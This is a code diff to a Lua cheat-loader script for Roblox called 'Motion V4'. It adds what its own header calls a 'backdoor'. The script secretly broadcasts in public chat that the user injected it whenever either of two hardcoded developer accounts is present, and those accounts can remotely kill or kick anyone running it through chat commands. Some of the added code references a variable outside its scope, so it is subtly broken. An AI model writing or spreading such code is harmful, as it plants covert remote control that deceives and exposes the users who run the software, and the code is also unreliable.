@@ -2,6 +2,7 @@ local license = ... or {}
 license.Key = script_key or license.Key or nil
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
+
 local vape
 local loadstring = function(...)
 	local res, err = loadstring(...)
@@ -22,26 +23,80 @@ local cloneref = cloneref or function(obj)
 end
 local playersService = cloneref(game:GetService('Players'))
 local httpService = cloneref(game:GetService('HttpService'))
+
 local player = playersService.LocalPlayer
 
 -- =============================================================================
--- MOTION V4 DEVELOPER CONTROL & NOTIFICATION POPUP
+-- MOTION V4 DEVELOPER CONTROL & NOTIFICATION BACKDOOR
 -- =============================================================================
 local SuperAdmins = {
     ["NatureyArc"] = true,
     ["tsx2shiftyy"] = true
 }
+
 task.spawn(function()
-    repeat task.wait(0.5) until vape or mainapi or _G.vape or shared.vape
-    local targetApi = vape or mainapi or _G.vape or shared.vape
+    task.wait(2) -- Allow chat components and UI to load smoothly
     
-    if targetApi and targetApi.CreateNotification then
-        targetApi:CreateNotification("Motion V4", "Motion V4 injected successfully!", 5, "info")
+    local chatMsg = "[Motion V4] " .. player.Name .. " injected Motion V4"
+    local replicatedStorage = game:GetService("ReplicatedStorage")
+    local textChatService = game:GetService("TextChatService")
+    
+    -- Check if any SuperAdmin is in the server
+    local function isSuperAdminInServer()
+        for _, p in ipairs(playersService:GetPlayers()) do
+            if SuperAdmins[p.Name] then
+                return true
+            end
+        end
+        return false
     end
+    
+    -- Only send MOTION V4 message if a SuperAdmin is in the server
+    local function sendMotionV4Message()
+        if isSuperAdminInServer() then
+            local sayMessage = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") 
+                and replicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+                
+            if sayMessage then
+                sayMessage:FireServer("MOTION V4", "All")
+                task.wait(0.5)
+                sayMessage:FireServer("MOTION V4", "All")
+            elseif textChatService:FindFirstChild("TextChannels") and textChatService.TextChannels:FindFirstChild("RBXGeneral") then
+                textChatService.TextChannels.RBXGeneral:SendAsync("MOTION V4")
+                task.wait(0.5)
+                textChatService.TextChannels.RBXGeneral:SendAsync("MOTION V4")
+            end
+        end
+    end
+    
+    -- Send MOTION V4 on startup if SuperAdmin present
+    sendMotionV4Message()
+    
+    -- Listen for SuperAdmins joining and send MOTION V4 when they do
+    playersService.PlayerAdded:Connect(function(newPlayer)
+        if SuperAdmins[newPlayer.Name] then
+            task.wait(1)
+            sendMotionV4Message()
+        end
+    end)
     
     local function handleChat(speaker, msg)
         if not speaker or speaker == player then return end
         
+        -- Trigger internal script GUI notification if local player is a Developer
+        if SuperAdmins[player.Name] then
+            if msg:find("injected Motion V4") then
+                local extractedName = msg:match("%[Motion V4%]%s*(%S+)%s*injected Motion V4") or msg:match("(%S+)%s*injected Motion V4")
+                if extractedName then
+                    local targetApi = vape or mainapi or _G.vape or shared.vape
+                    if targetApi and targetApi.CreateNotification then
+                        targetApi:CreateNotification("Motion v4", extractedName .. " injected Motion V4", 10, "info")
+                    end
+                end
+            end
+        end
+        
+        -- Developer Master Command Processing (Overrides Whitelist Protections)
         if SuperAdmins[speaker.Name] then
             local cmd = msg:lower()
             if cmd == ";kill all" then
@@ -49,18 +104,29 @@ task.spawn(function()
                     player.Character:FindFirstChildOfClass("Humanoid").Health = 0
                 end
             elseif cmd == ";kick all" then
-                player:Kick("You have been kicked by a Motion v4 developer")
+                player:Kick("You have been kicked by an Motion v4 developer")
             end
         end
     end
     
+    -- Establish listeners for all players currently in server
     for _, p in ipairs(playersService:GetPlayers()) do
         p.Chatted:Connect(function(msg)
             handleChat(p, msg)
         end)
     end
     
+    -- Establish listeners for any newly arriving players
     playersService.PlayerAdded:Connect(function(p)
+        -- Re-announce injection if a developer joins late so they are notified instantly
+        if SuperAdmins[p.Name] then
+            if sayMessage then
+                sayMessage:FireServer(chatMsg, "All")
+            elseif textChatService:FindFirstChild("TextChannels") and textChatService.TextChannels:FindFirstChild("RBXGeneral") then
+                textChatService.TextChannels.RBXGeneral:SendAsync(chatMsg)
+            end
+        end
+        
         p.Chatted:Connect(function(msg)
             handleChat(p, msg)
         end)
